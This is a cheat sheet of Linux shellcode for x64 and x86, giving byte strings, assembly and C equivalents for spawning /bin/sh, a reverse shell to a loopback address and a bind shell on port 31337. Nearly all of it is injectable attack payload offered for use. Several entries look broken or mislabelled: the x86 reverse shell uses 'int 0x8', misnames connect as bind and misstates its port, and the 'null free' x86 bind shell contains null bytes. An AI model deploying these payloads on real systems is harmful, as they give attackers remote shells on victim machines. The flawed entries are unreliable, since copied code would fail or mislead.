# Linux Shellcode

## Spawn Shell

- Equivalent C code
    ```c
    execve("/bin/sh", NULL, NULL);
    ```
- x64
    - Null Free, 22 Bytes
        - `"\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xf7\xee\xb0\x3b\x0f\x05"`
        - Source code
            ```
            ; execve("/bin/sh", 0, 0)
            xor esi, esi
            push rsi
            mov rbx, 0x68732f2f6e69622f
            push rbx
            push rsp
            pop rdi
            imul esi
            mov al, 0x3b
            syscall
            ```
- x86
    - Null Free, 22 Bytes
        - `"\x31\xc0\x31\xc9\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x34\x0b\xcd\x80"`
        - Source code
            ```
            ; execve("/bin/sh", 0, 0)
            xor eax, eax
            xor ecx, ecx
            cdq
            push eax
            push 0x68732f2f
            push 0x6e69622f
            mov ebx, esp
            xor al, 0xb
            int 0x80
            ```

## Reverse Shell

- Equivalent C code
    ```c
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(31337);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(sockfd, (struct sockaddr -)&addr, sizeof(addr));
    dup2(sockfd, 2);
    dup2(sockfd, 1);
    dup2(sockfd, 0);
    execve("/bin/sh", NULL, NULL);
    ```
- x64
    - Null Free, 65 bytes
        - `"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x68\x7f\x01\x01\x01\x66\x68\x7a\x69\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x89\xfe\xb0\x21\x0f\x05\xff\xce\x79\xf8\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x99\xb0\x3b\x0f\x05"`
        - Source code
            ```
            ; s = socket(2, 1, 0)
            push 0x29
            pop rax
            cdq
            push 0x2
            pop rdi
            push 0x1
            pop rsi
            syscall
            ; connect(s, [2, port, ip], 16)
            xchg rax, rdi
            push 0x101017f ; ip
            push word 0x697a ; port
            push word 0x2
            push rsp
            pop rsi
            mov dl, 0x10
            mov al, 0x2a
            syscall
            ; dup2(s, {2, 1, 0});
            mov esi, edi
            loop:
            mov al, 0x21
            syscall
            dec esi
            jns loop
            ; execve("/bin/sh", 0, 0)
            xor esi, esi
            push rsi
            mov rbx,0x68732f2f6e69622f
            push rbx
            push rsp
            pop rdi
            cdq
            mov al, 0x3b
            syscall
            ```
- x86
    - Null Free, 66 bytes
        - `"\x6a\x66\x58\x99\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x2b\x67\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x08"`
        - Source code
            ```
            ; socketcall(1, 2, 1, 0) = socket(2, 1, 0)
            push 0x66
            pop eax
            cdq
            xor ebx, ebx
            inc ebx
            push edx
            push ebx
            push 0x2
            mov ecx, esp
            int 0x80
            ; dup2(c, {2, 1, 0});
            pop ecx
            xchg eax, ebx
            loop:
            mov al, 0x3f
            int 0x80
            dec ecx
            jns loop
            ; socketcall(2, s, [2, port, ip], 16) = bind(s, [2, port, 0], 16)
            mov al, 0x66
            push 0x101017f ; ip 127.1.1.1
            push word 0x672b ; port 31337
            push 0x2
            mov ecx, esp
            push 0x10
            push ecx
            push ebx
            mov ecx, esp
            int 0x80
            ; execve("/bin/sh", 0, 0)
            mov al, 0xb
            push edx
            push 0x68732f2f
            push 0x6e69622f
            mov ebx, esp
            xor ecx, ecx
            int 0x8
            ```

## Bind Shell

- Equivalent C code
    ```c
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(31337);
    addr.sin_addr.s_addr = INADDR_ANY;
    bind(sockfd, (struct sockaddr -)&addr, sizeof(addr));
    listen(sockfd, 0);
    int new_sockfd = accept(sockfd, NULL, NULL);
    dup2(new_sockfd, 2);
    dup2(new_sockfd, 1);
    dup2(new_sockfd, 0);
    execve("/bin/sh", NULL, NULL);
    ```
- x64
    - Null Free, 74 bytes
        - `"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\xb0\x31\x52\x66\x68\x7a\x69\x66\x6a\x02\x54\x5e\xb2\x10\x0f\x05\xb0\x32\x31\xf6\x0f\x05\xb0\x2b\x99\x0f\x05\x48\x97\x89\xfe\xb0\x21\x0f\x05\xff\xce\x79\xf8\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x99\xb0\x3b\x0f\x05"`
        - Source code
            ```
            ; s = socket(2, 1, 0)
            push 0x29
            pop rax
            cdq
            push 0x2
            pop rdi
            push 0x1
            pop rsi
            syscall
            ; bind(s, [2, port, 0], 16)
            xchg rax, rdi
            mov al, 0x31
            push rdx
            push word 0x697a ; 31337
            push word 0x2
            push rsp
            pop rsi
            mov dl, 0x10
            syscall
            ; listen(s, 0)
            mov al, 0x32
            xor esi, esi
            syscall
            ; c = accept(s, 0, 0)
            mov al, 0x2b
            cdq
            syscall
            ; dup2(c, {2, 1, 0}); 
            xchg rax, rdi
            mov esi, edi
            loop:
            mov al, 0x21
            syscall
            dec esi
            jns loop
            ; execve("/bin/sh", 0, 0)
            xor esi, esi
            push rsi
            mov rbx, 0x68732f2f6e69622f
            push rbx
            push rsp
            pop rdi
            cdq
            mov al, 0x3b
            syscall
            ```
- x86
    - Null Free, 90 bytes
        - `"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x68\x7a\x69\x00\x00\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"`
        - Source code
            ```
            ; socketcall(1, 2, 1, 0) = socket(2, 1, 0)
            push 0x66
            pop eax
            push 0x1
            pop ebx
            xor esi, esi
            push esi
            push ebx
            push 0x2
            mov ecx, esp
            int 0x80
            ; socketcall(2, s, [2, port, 0], 16) = bind(s, [2, port, 0], 16)
            pop edi
            xchg edi, eax
            xchg ebx, eax
            mov al, 0x66
            push esi
            push 0x697a ; port 31337
            push bx
            mov ecx, esp
            push 0x10
            push ecx
            push edi
            mov ecx, esp
            int 0x80
            ; socketcall(4, s, 0) = listen(s, 0)
            mov al, 0x66
            mov bl, 0x4
            push esi
            push edi
            mov ecx, esp
            int 0x80
            ; socketcall(5, s, 0, 0) = accept(s, 0, 0)
            mov al, 0x66
            inc ebx
            push esi
            push esi
            push edi
            mov ecx, esp
            int 0x80
            ; dup2(c, {2, 1, 0});
            pop ecx
            pop ecx
            mov cl, 0x2
            xchg ebx, eax
            loop:
            mov al, 0x3f
            int 0x80
            dec ecx
            jns loop
            ; execve("/bin/sh", 0, 0)
            mov al, 0xb
            push 0x68732f2f
            push 0x6e69622f
            mov ebx, esp
            inc ecx
            mov edx, ecx
            int 0x80
            ```
